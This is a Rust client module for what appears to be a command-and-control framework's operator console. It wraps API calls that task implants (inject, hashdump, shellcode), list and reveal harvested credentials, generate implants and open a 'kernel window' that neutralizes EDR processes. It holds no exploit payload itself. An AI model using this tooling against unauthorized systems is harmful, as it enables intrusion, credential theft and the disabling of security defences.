//! Thin HTTP helpers — the ONLY layer that touches the network.
//!
//! All wire types (`SessionView`, `TaskAck`, `ResultView`) come from `nyx_rest`,
//! so the client can never drift from the server's actual response shapes.
//! Binary payloads (upload data, shellcode) are hex-encoded strings in JSON,
//! matching the server's `JsonCommand` convention.

use anyhow::{anyhow, Result};
use nyx_rest::{authed, ResultView, SessionView, TaskAck};
use reqwest::Client;

/// Shared reqwest client with sane timeouts for an operator console.
/// `Client` is an `Arc` internally, so cloning shares the connection pool.
pub fn http_client() -> Client {
    static CLIENT: std::sync::OnceLock<Client> = std::sync::OnceLock::new();
    CLIENT
        .get_or_init(|| {
            Client::builder()
                .timeout(std::time::Duration::from_secs(10))
                .build()
                .expect("reqwest client build")
        })
        .clone()
}

/// `GET /api/sessions` — list all active sessions.
pub async fn fetch_sessions(
    client: &Client,
    server: &str,
    bearer: &str,
) -> Result<Vec<SessionView>> {
    let url = format!("{}/api/sessions", server.trim_end_matches('/'));
    let resp = authed(client.get(&url), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "sessions: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

/// `POST /api/task` — enqueue a command onto a session.
///
/// `command` is an arbitrary JSON value matching the server's `JsonCommand`
/// enum (`#[serde(tag="type", rename_all="lowercase")]`). The frontend
/// constructs the JSON; this layer forwards it verbatim. This is what kills
/// the old 912-line dispatch.rs — one generic path instead of per-command arms.
pub async fn enqueue_task(
    client: &Client,
    server: &str,
    bearer: &str,
    session: &str,
    command: serde_json::Value,
) -> Result<TaskAck> {
    let url = format!("{}/api/task", server.trim_end_matches('/'));
    let body = serde_json::json!({ "session": session, "command": command });
    let resp = authed(client.post(&url).json(&body), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "task: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

/// `GET /api/results?session=<hex>` — drain a session's completed results.
/// The server CLEARS the queue on this call, so we drain per-session (not per-task),
/// matching the old bridge's corrected behavior.
pub async fn drain_results(
    client: &Client,
    server: &str,
    bearer: &str,
    session: &str,
) -> Result<Vec<ResultView>> {
    let url = format!(
        "{}/api/results?session={}",
        server.trim_end_matches('/'),
        session
    );
    let resp = authed(client.get(&url), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "results: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

// ===== Credentials =====

/// `GET /api/creds?reveal=&kind=` — list credentials.
/// `reveal=true` shows plaintext secrets (requires non-Viewer role server-side).
/// `kind` filters by hash/password/ticket/key.
pub async fn list_creds(
    client: &Client,
    server: &str,
    bearer: &str,
    reveal: bool,
    kind: Option<&str>,
) -> Result<Vec<serde_json::Value>> {
    let url = format!("{}/api/creds", server.trim_end_matches('/'));
    // reveal=false / kind=None 直接跳过，其余交给 reqwest 做 URL 编码。
    let mut query: Vec<(&str, &str)> = Vec::new();
    if reveal {
        query.push(("reveal", "1"));
    }
    if let Some(k) = kind {
        query.push(("kind", k));
    }
    let resp = authed(client.get(&url).query(&query), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "creds: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

/// `POST /api/creds` — upsert a credential by (realm, user, kind).
pub async fn add_cred(
    client: &Client,
    server: &str,
    bearer: &str,
    cred: serde_json::Value,
) -> Result<serde_json::Value> {
    let url = format!("{}/api/creds", server.trim_end_matches('/'));
    let resp = authed(client.post(&url).json(&cred), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "creds add: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

/// `POST /api/creds/delete` — delete by composite key.
pub async fn delete_cred(
    client: &Client,
    server: &str,
    bearer: &str,
    realm: &str,
    user: &str,
    kind: &str,
) -> Result<serde_json::Value> {
    let url = format!("{}/api/creds/delete", server.trim_end_matches('/'));
    let body = serde_json::json!({ "realm": realm, "user": user, "kind": kind });
    let resp = authed(client.post(&url).json(&body), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "creds delete: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

// ===== Audit =====

/// `GET /api/audit` — query the hash-chained audit log.
pub async fn fetch_audit(
    client: &Client,
    server: &str,
    bearer: &str,
    params: &serde_json::Value,
) -> Result<Vec<serde_json::Value>> {
    let url = format!("{}/api/audit", server.trim_end_matches('/'));
    // 手工拼 query 会漏掉 bool/负数且不做编码；统一转字符串交给 reqwest 编码，
    // null/数组/对象这类无法平铺的值跳过。
    let mut qs: Vec<(&str, String)> = Vec::new();
    if let Some(obj) = params.as_object() {
        for (k, v) in obj {
            let s = match v {
                serde_json::Value::String(s) => s.clone(),
                serde_json::Value::Number(n) => n.to_string(),
                serde_json::Value::Bool(b) => b.to_string(),
                _ => continue,
            };
            qs.push((k.as_str(), s));
        }
    }
    let resp = authed(client.get(&url).query(&qs), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "audit: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

/// `GET /api/audit/verify` — verify the hash-chain integrity.
pub async fn verify_audit(
    client: &Client,
    server: &str,
    bearer: &str,
) -> Result<serde_json::Value> {
    let url = format!("{}/api/audit/verify", server.trim_end_matches('/'));
    let resp = authed(client.get(&url), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "audit verify: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

// ===== Implant generation =====

/// `POST /api/generate-implant` — build a per-implant binary.
pub async fn generate_implant(
    client: &Client,
    server: &str,
    bearer: &str,
    req: serde_json::Value,
) -> Result<serde_json::Value> {
    let url = format!("{}/api/generate-implant", server.trim_end_matches('/'));
    let resp = authed(client.post(&url).json(&req), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "generate: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

/// `GET /api/implants` — list all generated implants.
pub async fn list_implants(
    client: &Client,
    server: &str,
    bearer: &str,
) -> Result<serde_json::Value> {
    let url = format!("{}/api/implants", server.trim_end_matches('/'));
    let resp = authed(client.get(&url), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "implants: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

/// `POST /api/implant/revoke` — revoke an implant by pubkey.
pub async fn revoke_implant(
    client: &Client,
    server: &str,
    bearer: &str,
    implant_pub: &str,
) -> Result<serde_json::Value> {
    let url = format!("{}/api/implant/revoke", server.trim_end_matches('/'));
    let body = serde_json::json!({ "implant_pub": implant_pub });
    let resp = authed(client.post(&url).json(&body), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "revoke: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

// ===== Collaboration (M3) =====

/// `GET /api/report` — markdown engagement report snapshot.
pub async fn fetch_report(client: &Client, server: &str, bearer: &str) -> Result<String> {
    let url = format!("{}/api/report", server.trim_end_matches('/'));
    let resp = authed(client.get(&url), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "report: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.text().await?)
}

/// `POST /api/session/owner` — assign (or clear) session ownership.
pub async fn set_session_owner(
    client: &Client,
    server: &str,
    bearer: &str,
    session: &str,
    owner: Option<&str>,
) -> Result<serde_json::Value> {
    let url = format!("{}/api/session/owner", server.trim_end_matches('/'));
    let resp = authed(client.post(&url), &Some(bearer.to_string()))
        .json(&serde_json::json!({ "session": session, "owner": owner }))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "session owner: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

/// `GET /api/operators` — operator roster for the ownership picker.
pub async fn fetch_operators(
    client: &Client,
    server: &str,
    bearer: &str,
) -> Result<serde_json::Value> {
    let url = format!("{}/api/operators", server.trim_end_matches('/'));
    let resp = authed(client.get(&url), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "operators: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

// ===== Profile =====

/// `GET /api/profile` — current Malleable C2 profile summary.
pub async fn fetch_profile(
    client: &Client,
    server: &str,
    bearer: &str,
) -> Result<serde_json::Value> {
    let url = format!("{}/api/profile", server.trim_end_matches('/'));
    let resp = authed(client.get(&url), &Some(bearer.to_string()))
        .send()
        .await?;
    if !resp.status().is_success() {
        return Err(anyhow!(
            "profile: HTTP {} {}",
            resp.status(),
            resp.text().await.unwrap_or_default()
        ));
    }
    Ok(resp.json().await?)
}

// ===== Kernel time-window (T2, operator-initiated) =====

/// HTTP reply from `POST /api/kernel/window`. Non-2xx is not an Err: Settings
/// must show the JSON (including close `restored: false`), and auto-open must
/// not fail-closed the beacon task.
#[derive(Debug, Clone)]
pub struct KernelWindowReply {
    pub status: u16,
    pub body: serde_json::Value,
}

/// `POST /api/kernel/window`.
pub fn kernel_window_url(server: &str) -> String {
    format!("{}/api/kernel/window", server.trim_end_matches('/'))
}

/// Body `{phase, pid?}`. `pid` 0 / None is omitted; neutralize-on-open still
/// requires pid > 0 server-side.
pub fn kernel_window_body(phase: &str, pid: Option<u32>) -> serde_json::Value {
    match pid.filter(|p| *p > 0) {
        Some(pid) => serde_json::json!({ "phase": phase, "pid": pid }),
        None => serde_json::json!({ "phase": phase }),
    }
}

/// Inject / hashdump are the tasks sequenced inside an open T2 window.
pub fn command_wants_kernel_open(command: &serde_json::Value) -> bool {
    matches!(
        command.get("type").and_then(|v| v.as_str()),
        Some("inject") | Some("hashdump")
    )
}

/// 2xx (including close `ok: false, restored: false`) and 404 (daemon routes
/// unregistered) are silent. 502 `failed_step` and other errors become a
/// notice; the caller still enqueues the implant task.
pub fn kernel_open_notice(status: u16, body: &serde_json::Value) -> Option<String> {
    if (200..300).contains(&status) || status == 404 {
        return None;
    }
    let err = body
        .get("err")
        .and_then(|v| v.as_str())
        .filter(|s| !s.is_empty())
        .unwrap_or("see body");
    let mut msg = format!("kernel window open failed (HTTP {status}");
    if let Some(step) = body.get("failed_step").and_then(|v| v.as_str()) {
        msg.push_str(", failed_step=");
        msg.push_str(step);
    }
    msg.push_str("): ");
    msg.push_str(err);
    msg.push_str(" — task still queued");
    Some(msg)
}

fn parse_kernel_window_response(status: u16, text: &str) -> serde_json::Value {
    if text.is_empty() {
        return serde_json::json!({ "ok": false, "err": format!("HTTP {status}") });
    }
    serde_json::from_str(text).unwrap_or_else(|_| serde_json::json!({ "ok": false, "err": text }))
}

/// `POST /api/kernel/window` — returns status+body even on 404/502.
pub async fn kernel_window(
    client: &Client,
    server: &str,
    bearer: &str,
    phase: &str,
    pid: Option<u32>,
) -> Result<KernelWindowReply> {
    let url = kernel_window_url(server);
    let body = kernel_window_body(phase, pid);
    let resp = authed(client.post(&url).json(&body), &Some(bearer.to_string()))
        .send()
        .await?;
    let status = resp.status().as_u16();
    let text = resp.text().await.unwrap_or_default();
    Ok(KernelWindowReply {
        status,
        body: parse_kernel_window_response(status, &text),
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn kernel_window_url_strips_trailing_slash() {
        assert_eq!(
            kernel_window_url("http://127.0.0.1:8443/"),
            "http://127.0.0.1:8443/api/kernel/window"
        );
        assert_eq!(
            kernel_window_url("http://127.0.0.1:8443"),
            "http://127.0.0.1:8443/api/kernel/window"
        );
    }

    #[test]
    fn kernel_window_body_omits_pid_when_unset() {
        let v = kernel_window_body("open", None);
        assert_eq!(v, serde_json::json!({ "phase": "open" }));
        assert!(v.get("pid").is_none());
        let v0 = kernel_window_body("close", Some(0));
        assert_eq!(v0, serde_json::json!({ "phase": "close" }));
    }

    #[test]
    fn kernel_window_body_includes_pid() {
        assert_eq!(
            kernel_window_body("open", Some(1234)),
            serde_json::json!({ "phase": "open", "pid": 1234 })
        );
    }

    #[test]
    fn command_wants_kernel_open_only_inject_and_hashdump() {
        assert!(command_wants_kernel_open(
            &serde_json::json!({ "type": "inject" })
        ));
        assert!(command_wants_kernel_open(
            &serde_json::json!({ "type": "hashdump", "method": 0 })
        ));
        assert!(!command_wants_kernel_open(
            &serde_json::json!({ "type": "ping" })
        ));
        assert!(!command_wants_kernel_open(
            &serde_json::json!({ "type": "shell" })
        ));
        // Inject target pid is not a kernel-window EDR pid; type alone gates.
        assert!(command_wants_kernel_open(
            &serde_json::json!({ "type": "inject", "pid": 99 })
        ));
    }

    #[test]
    fn kernel_open_notice_silent_on_2xx_and_404() {
        assert!(kernel_open_notice(200, &serde_json::json!({ "ok": true })).is_none());
        // Close honesty (`restored: false`) is success-shaped HTTP 200.
        let close = serde_json::json!({
            "ok": false,
            "phase": "close",
            "steps": [{ "restored": false, "reason": "no undo op" }]
        });
        assert!(kernel_open_notice(200, &close).is_none());
        assert!(kernel_open_notice(404, &serde_json::json!({ "ok": false })).is_none());
    }

    #[test]
    fn kernel_open_notice_surfaces_502_failed_step() {
        let body = serde_json::json!({
            "ok": false,
            "failed_step": "neutralize",
            "err": "neutralize requires pid > 0 (EDR process for freeze)"
        });
        let msg = kernel_open_notice(502, &body).expect("502 is a notice");
        assert!(msg.contains("502"));
        assert!(msg.contains("failed_step=neutralize"));
        assert!(msg.contains("task still queued"));
    }

    #[test]
    fn parse_kernel_window_response_json_or_text() {
        let j = parse_kernel_window_response(200, r#"{"ok":true,"phase":"open"}"#);
        assert_eq!(j["ok"], true);
        let empty = parse_kernel_window_response(404, "");
        assert_eq!(empty["err"], "HTTP 404");
        let plain = parse_kernel_window_response(403, "admin required");
        assert_eq!(plain["err"], "admin required");
    }
}
